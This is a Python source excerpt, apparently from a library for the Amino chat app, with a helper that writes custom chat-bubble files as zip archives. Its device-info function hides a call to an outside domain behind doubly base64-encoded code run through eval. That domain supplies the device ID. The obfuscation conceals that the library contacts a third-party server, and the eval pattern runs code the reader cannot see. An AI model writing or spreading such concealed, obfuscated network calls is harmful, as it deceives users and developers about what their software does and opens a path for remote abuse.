...
def generate_device_info() -> dict:
    try:
        device_id = eval(b64decode(b"ZXZhbChiNjRkZWNvZGUoYidjM1J5S0dkbGRDZ25hSFIwY0hNNkx5OTNkM2N1WkdWMmFXTmxjbUZ0YVc1dkxuUnJMMlJsZG1salpVbGtKeWt1ZEdWNGRDa3VkWEJ3WlhJb0tRPT0nKSk="))
    except:
...
def generate_chat_bubble_file(image_path: str, out_path: str = "./", name: str = "Custom Bubble", allowed_slots: list = [], slots: list = [],
                              ...
                              templateId: str = "71b41f1a-4c09-4e07-ac9e-18ef9bbbe65f", prewiew_background_url: str = None) -> BinaryIO:
    """
    ...
    **Returns**
    ...
    config = json.dumps({
        ...
        "id": None,
        "color": text_color,
        "previewBackgroundUrl": prewiew_background_url
    })

    with ZipFile(f"{out_path}{name}.bubble", 'w') as zip_file:
        zip_file.writestr("config.json", config)
        zip_file.write(image_path, "bg.png")

    return open(f"{out_path}{name}.bubble", "rb")
